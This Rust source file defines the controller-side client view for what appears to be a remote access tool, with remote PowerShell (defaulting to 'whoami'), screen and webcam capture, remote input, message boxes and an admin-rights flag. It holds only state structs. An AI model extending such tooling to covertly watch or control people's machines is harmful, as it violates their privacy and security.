use crate::{
    manager::types::UiManagerCommand,
    ui::{client::types::*, windows::ClientWindowState},
};

use shared::commands::{CaptureQuality, ComputerInfoResponse};
use tokio::sync::mpsc::UnboundedSender;

////////////////////
pub mod types;
////////////////////

pub struct ClientViewState {
    // pub visible: bool,
    pub windows: ClientWindowState,
    pub powershell: PowerShellView,
    pub input: ClientViewInputState,
    pub selected_monitor: u32,
    pub selected_webcam: u32,
    pub captures: ClientViewCaptures,
    pub textures: ClientViewTextures,
    pub capturing: ClientViewCaptureState,
    pub msgbox: MsgboxView,
}
pub struct ClientView {
    pub mutex: String,
    pub elevated: bool, // do we have admin on the client
    pub state: ClientViewState,
    pub socket: String,
    pub info: ComputerInfoResponse,
    pub sender: UnboundedSender<UiManagerCommand>,
}
impl ClientView {
    pub fn new(
        socket: String,
        mutex: String,
        info: ComputerInfoResponse,
        sender: UnboundedSender<UiManagerCommand>,
    ) -> Self {
        Self {
            mutex: mutex,
            elevated: info.elevated, // assume no
            socket: socket,
            state: ClientViewState {
                //visible: false,
                selected_monitor: 0,
                selected_webcam: 0,
                windows: ClientWindowState::default(),
                input: ClientViewInputState {
                    active: false,
                    clicking: false,
                    last_update: None,
                    last_position: None,
                },
                powershell: PowerShellView {
                    powershell: false,
                    input: String::from("whoami"),
                    output: String::from("\n"),
                },
                captures: ClientViewCaptures {
                    screen: ClientViewCapture {
                        max_scale: 1.5,
                        quality: CaptureQuality::Speed,
                        scale: 1.0,
                        data: None,
                    },
                    webcam: ClientViewCapture {
                        max_scale: 1.0,
                        quality: CaptureQuality::Speed,
                        scale: 0.35,
                        data: None,
                    },
                },
                textures: ClientViewTextures {
                    screen: None,
                    webcam: None,
                },
                capturing: ClientViewCaptureState::default(),
                msgbox: MsgboxView::default(),
            },
            // socket: socket,
            info: info,
            sender: sender,
        }
    }
}
